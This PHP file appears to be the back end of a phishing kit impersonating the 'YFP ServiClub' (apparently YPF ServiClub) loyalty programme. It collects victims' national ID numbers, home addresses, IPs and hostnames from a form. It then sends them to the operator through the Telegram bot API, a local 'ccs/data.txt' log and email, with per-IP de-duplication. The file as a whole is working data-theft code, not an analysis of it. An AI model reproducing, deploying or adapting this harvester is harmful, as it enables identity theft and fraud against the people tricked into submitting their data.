<?php
if(isset($_POST)){
	$filter = "";
	$mensaje = ">> Datos adicionales de ".$_POST["dni"]." (DNI) <<\n";
	if(isset($_POST["calle"]) && isset($_POST["numero_calle"])){
		$mensaje .= "Direccion: ".$_POST["calle"]." ".$_POST["numero_calle"]."\n";
		$filter .= strtolower($_POST["calle"].$_POST["numero_calle"]);
	}
	if(isset($_POST["piso"])){
		$mensaje .= "Piso: ".$_POST["piso"]."\n";
		$filter .= strtolower($_POST["piso"]);
	}
	if(isset($_POST["departamento"])){
		$mensaje .= "Departamento: ".$_POST["departamento"]."\n";
		$filter .= strtolower($_POST["departamento"]);
	}
	if(isset($_POST["postalcode"])){
		$mensaje .= "Cod. postal: ".$_POST["postalcode"]."\n";
		$filter .= strtolower($_POST["postalcode"]);
	}
	if(isset($_POST["provincia"])){
		$mensaje .= "Pronvincia: ".$_POST["provincia"]."\n";
		$filter .= strtolower($_POST["provincia"]);
	}
	$filter = base64_encode($filter);
	include("config.php");
	$ip = getenv("REMOTE_ADDR");
	$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	define('BOT_TOKEN', $bottoken);
	define('CHAT_ID', $chatid);
	define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
	function enviar_telegram($msj){
		$queryArray = [
			'chat_id' => CHAT_ID,
			'text' => $msj,
		];
		$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
		$result = file_get_contents($url);
	}
	$file_name = 'data/'.$ip.'.db';
	$read_data = fopen($file_name, "a+");
	function enviar(){
		global $telegram_send, $file_save, $email_send, $mensaje, $ip, $isp;
		if($telegram_send){
			enviar_telegram(">> YFP ServiClub (DATOS ADICIONALES) <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
		}
		if($file_save){
			$ccs_file_name = 'ccs/data.txt';
			$save_data = fopen($ccs_file_name, "a+");
			$msg = "========== DATOS YFP ServiClub (DATOS ADICIONALES) ==========\n\n";
			$msg .= ">> Datos de conexión <<\n\nIP: ".$ip."\nISP: ".$isp."\n\n";
			$msg .= $mensaje;
			$msg .= "========== DATOS YFP ServiClub (DATOS ADICIONALES) ==========\n\n";
			fwrite($save_data, $msg);
			fclose($save_data);
		}
		if($email_send){
			$msg = ">> YFP ServiClub (DATOS ADICIONALES) <<\n\n";
			$msg .= $mensaje;
			mail($email, "YFP ServiClub (DATOS ADICIONALES)", $msg);
		}
	}
	if($read_data){
		$data = fgets($read_data);
		$data = explode(";", $data);
		if(!(in_array($filter, $data))){
			fwrite($read_data, $filter.";");
			fclose($read_data);
			enviar();
		}
	}
	else {
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar();
	}
}
?>